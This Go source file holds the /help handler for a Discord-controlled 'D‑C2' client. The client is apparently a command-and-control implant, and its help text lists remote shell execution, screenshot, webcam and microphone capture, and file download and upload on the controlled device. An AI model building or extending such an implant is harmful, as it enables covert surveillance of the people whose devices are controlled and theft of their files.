package main

// This file contains the /help slash command handler and a small interface
// that allows it to be tested independently from a real Discord session.

import "github.com/bwmarrin/discordgo"

// helpResponder abstracts the InteractionRespond method so the help handler
// can be exercised in unit tests without a live Discord connection.
type helpResponder interface {
	InteractionRespond(*discordgo.Interaction, *discordgo.InteractionResponse) error
}

// handleSlashHelp sends an ephemeral help message that summarizes the available
// controls for this D‑C2 client.
//
// Parameters:
//   - r: interaction responder used to send the help message back to Discord.
//   - i: interaction that triggered the help request.
//
// The response is sent as an ephemeral message, so it is only visible to the
// operator who invoked the command. The content covers slash commands, emoji
// shortcuts, and quick‑action buttons that can be used to control the client.
//
// Example:
//
//   // Inside the interaction dispatcher:
//   case "help":
//       handleSlashHelp(s, i)
func handleSlashHelp(r helpResponder, i *discordgo.InteractionCreate) {
	// Build a single formatted help message so operators can quickly see which
	// controls are available in this device channel.
	content := "**D‑C2 Help**\n\n" +
		"Use these controls in this device channel:\n\n" +
		"**Slash commands**\n" +
		"/cmd `<command>`          – run shell command\n" +
		"/screenshot              – capture screenshots of all displays\n" +
		"/camera                  – capture a snapshot from the default camera\n" +
		"/mic `[duration]` `[path]` – record from microphone (seconds, optional path)\n" +
		"/record `<source>`       – record video in segmented files (camera/screen)\n" +
		"/log `<on|off>`          – stream or stop logs into this channel\n" +
		"/cwd                     – show current working directory\n" +
		"/ls `[path]`              – list directory (current or given path)\n" +
		"/download `<src>` `[dst]` – download file (src path, optional label)\n" +
		"/upload `<file>` `<dst>`  – upload attached file to dst path\n" +
		"/restart                 – restart this client process\n\n" +
		"**Emoji commands**\n" +
		"📸                        – capture screenshots of all displays\n" +
		"📷                        – capture a snapshot from the default camera\n" +
		"🎙                        – record 10 seconds from microphone\n" +
		"👇 `<path>`                – download file from this machine (size < 8 MB)\n" +
		"☝️ `<path>` *attach         – upload attached file to this path\n" +
		"🔁                        – restart this client\n" +
		"💀                        – terminate this client\n\n" +
		"**Buttons**\n" +
		"whoami                    – show current user\n" +
		"id                        – show user / UID information\n" +
		"hostname                  – show device hostname\n" +
		"ip info                   – show IP configuration\n" +
		"cwd                       – show current working directory\n\n" +
		"Send `help` or `/help` anytime to show this help again."
	// Reply with an ephemeral message so that the help text does not clutter
	// the channel for other operators.
	r.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: content,
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}
